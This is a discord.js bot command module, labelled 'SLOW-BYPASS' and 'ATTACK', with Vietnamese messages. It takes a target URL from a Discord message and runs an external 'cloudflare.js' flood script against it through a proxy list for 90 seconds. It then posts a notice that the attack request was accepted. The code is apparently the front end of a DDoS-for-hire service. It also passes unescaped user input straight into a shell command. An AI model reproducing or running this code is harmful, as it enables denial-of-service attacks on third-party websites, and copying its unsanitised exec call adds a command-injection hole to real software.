const Discord = require("discord.js");
exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('WARRING')
	.setDescription("`Ex .SLOW-BYPASS url `")
	.setFooter("Thời gian tối đa max 90s thôi nha bé!")
	message.channel.send(embed1);
	return;
	}

// Command attack
var exec = require('child_process').exec
exec(`node cloudflare.js ${host} 90 500 ProxyViet.txt `, (error, stdout, stderr) => {
});

// Start Attacking
setTimeout(function(){ 
    console.log('Start Attacking ID Discord:' +  message.guild.id)

const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ɢᴀʟᴀxʏ ɢʟᴏʙᴀʟ** 🚀')
	.setTimestamp()
  .setDescription("** ʏêᴜ ᴄầᴜ đượᴄ ᴄʜấᴘ ᴛʜᴜậɴ **")
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds

// Attack Gif
var gifler = ["https://giphy.com/gifs/storm-timelapse-qRY3cPYRkyQh2"];
    var attackgif = gifler[Math.floor((Math.random() * gifler.length))];

// Verify Gif
var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
		var loadinggif = gify[Math.floor((Math.random() * gify.length))];

// Start Verify
console.log('Start Verify ID Discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **ɢᴀʟᴀxʏ ɢʟᴏʙᴀʟ** 🚀')
	.setTimestamp()
	.setDescription("** Waiting verify **")
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }


exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['raw'],
  permLevel: 0
}

exports.help = {
  name: 'SLOW-BYPASS',
  description: 'ATTACK',
  usage: 'SLOW-BYPASS'
}
